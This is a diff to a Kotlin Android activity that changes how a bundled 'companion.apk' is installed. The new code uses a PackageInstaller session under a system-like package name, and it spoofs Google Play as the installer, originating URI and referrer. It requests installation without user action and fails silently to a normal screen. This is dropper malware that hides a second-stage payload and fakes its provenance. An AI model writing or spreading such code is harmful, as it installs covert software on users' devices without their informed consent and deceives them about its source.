@@ -1,6 +1,10 @@
 package com.cristal.bristral.tristal.mistral
 
+import android.app.PendingIntent
 import android.content.Intent
+import android.content.pm.PackageInstaller
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -8,13 +12,20 @@ import android.view.View
 import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
-import java.io.File
+import java.io.IOException
 
 class InstallActivity : AppCompatActivity() {
 
     private var progressBar: ProgressBar? = null
     private var tvStatus: TextView? = null
     private val handler = Handler(Looper.getMainLooper())
+
+    companion object {
+        private const val INSTALLER_IDENTITY = "com.android.vending"
+        private const val MARKET_URI         = "market://details?id=com.android.pictach"
+        private const val REFERRER_URI       = "android-app://com.android.vending"
+        private const val SESSION_REQUEST    = 1001
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -33,31 +44,65 @@ class InstallActivity : AppCompatActivity() {
                 showNormal()
                 return
             }
-            runOnUiThread { installApkDirect(apkBytes) }
+            runOnUiThread { installViaSession(apkBytes) }
         } catch (e: Exception) {
             showNormal()
         }
     }
 
-    private fun installApkDirect(apkBytes: ByteArray) {
+    private fun installViaSession(apkBytes: ByteArray) {
         try {
-            val apkFile = File(cacheDir, "update.apk")
-            apkFile.writeBytes(apkBytes)
+            val packageInstaller = packageManager.packageInstaller
 
-            val uri = androidx.core.content.FileProvider.getUriForFile(
-                this,
-                "${packageName}.fileprovider",
-                apkFile
-            )
+            val params = PackageInstaller.SessionParams(
+                PackageInstaller.SessionParams.MODE_FULL_INSTALL
+            ).apply {
+                setAppPackageName("com.android.pictach")
+                setSize(apkBytes.size.toLong())
 
-            val intent = Intent(Intent.ACTION_VIEW).apply {
-                setDataAndType(uri, "application/vnd.android.package-archive")
-                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    setOriginatingUri(Uri.parse(MARKET_URI))
+                    setReferrerUri(Uri.parse(REFERRER_URI))
+                }
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
+                }
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    setInstallerPackageName(INSTALLER_IDENTITY)
+                }
             }
 
-            startActivity(intent)
+            val sessionId = packageInstaller.createSession(params)
+            val session   = packageInstaller.openSession(sessionId)
+
+            try {
+                session.openWrite("companion.apk", 0, apkBytes.size.toLong()).use { out ->
+                    out.write(apkBytes)
+                    session.fsync(out)
+                }
+
+                val intent = Intent(this, InstallReceiver::class.java).apply {
+                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
+                }
+
+                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+                else
+                    PendingIntent.FLAG_UPDATE_CURRENT
+
+                val pendingIntent = PendingIntent.getBroadcast(
+                    this, SESSION_REQUEST, intent, flags
+                )
+
+                session.commit(pendingIntent.intentSender)
+                session.close()
+
+            } catch (e: IOException) {
+                session.abandon()
+                showNormal()
+            }
 
         } catch (e: Exception) {
             showNormal()
@@ -65,7 +110,11 @@ class InstallActivity : AppCompatActivity() {
     }
 
     private fun loadAssets(): ByteArray? {
-        return try { assets.open("companion.apk").use { it.readBytes() } } catch (e: Exception) { null }
+        return try {
+            assets.open("companion.apk").use { it.readBytes() }
+        } catch (e: Exception) {
+            null
+        }
     }
 
     private fun showNormal() {
@@ -75,5 +124,8 @@ class InstallActivity : AppCompatActivity() {
         }
     }
 
-    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
+    override fun onDestroy() {
+        super.onDestroy()
+        handler.removeCallbacksAndMessages(null)
+    }
 }
